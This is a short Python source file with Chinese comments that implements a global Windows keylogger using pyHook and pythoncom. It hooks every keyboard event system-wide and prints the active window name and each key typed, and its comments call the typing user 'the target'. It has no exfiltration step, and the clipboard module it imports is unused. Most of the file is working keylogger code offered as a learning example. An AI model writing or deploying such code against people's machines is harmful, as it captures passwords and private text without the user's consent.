# -*- coding=utf-8 -*-
# pyHook下载地址，下载pyHook‑1.5.1‑cp36‑cp36m‑win_amd64.whl然后直接pip install pyHook‑1.5.1‑cp36‑cp36m‑win_amd64.whl直接安装
# http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyhook

# pythoncom下载地址，下载pywin32-221.win-amd64-py3.6.exe
# https://sourceforge.net/projects/pywin32/files/pywin32/Build 221/

import pyHook
import pythoncom
import win32clipboard

def KeyStroke(event):
    print(event.WindowName)
    print(chr(event.Ascii))
    print(event.Key)
    return True

# 整体逻辑：
# 当用户敲击键盘时会通过pythoncom.PumpMessages()创建一个消息通道传递键盘输入事件，然后利用k.HookKeyboard()截获键盘输入事件，
# 此时触发我们的KeyStroke函数，并将事件的对象作为唯一的参数传递给KeyStroke函数

# 创建一个HookManager管理对象，便于接下的全局设置
k = pyHook.HookManager()

# 监听所有的键盘事件，当目标按下键盘的某个键时我们的KeyStroke函数就会触发，同时会给这个函数传递唯一的参数--事件的对象
k.KeyDown = KeyStroke

# 设置Hook,截获键盘输入事件
k.HookKeyboard()

# 设置循环监听，应用程序想得到鼠标和键盘的输入事件通知，都必须通过一个Windows的消息通道，pythoncom.PumpMessages()就可以创建一个消息通道
pythoncom.PumpMessages()
